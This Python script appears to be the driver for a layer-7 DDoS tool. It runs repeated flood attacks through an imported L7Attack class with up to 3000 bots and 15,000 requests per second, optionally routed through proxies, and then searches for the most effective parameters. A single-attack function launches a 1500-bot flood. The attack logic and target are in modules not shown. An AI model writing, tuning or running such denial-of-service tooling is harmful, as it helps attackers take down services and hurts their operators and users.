import asyncio, time
from ddos.attacks.l7_attack import L7Attack
from utils.analyses.l7_analyses import search_best_params


# Test n attack series for search best params
def attack_series(n: int = 10):
    def temp(bc: list, rps: list, proxy: bool):
        for b, r in zip(bc, rps):
            if proxy:
                l7_attack = L7Attack(bots_count=b, rps=r, proxy=proxy)
            else:
                l7_attack = L7Attack(bots_count=b, rps=r)
            for i in range(n):
                asyncio.run(l7_attack.attack())
                time.sleep(10)
        search_best_params(proxy_flag=proxy)

    bot_count = [250, 500, 750, 1000, 1250, 1500, 1750, 2000, 2250, 2500, 2750, 3000]
    requests_per_second = [ x*5 for x in bot_count ]
    temp(bot_count, requests_per_second, True)
    temp(bot_count, requests_per_second, False)

# Test single attack
def attack(proxy: bool, bots_count: int = 1500, rps: int = 7500):
    if proxy:
        l7_attack = L7Attack(bots_count=bots_count, rps=rps, proxy=proxy)
    else:
        l7_attack = L7Attack(bots_count=bots_count, rps=rps)
    asyncio.run(l7_attack.attack())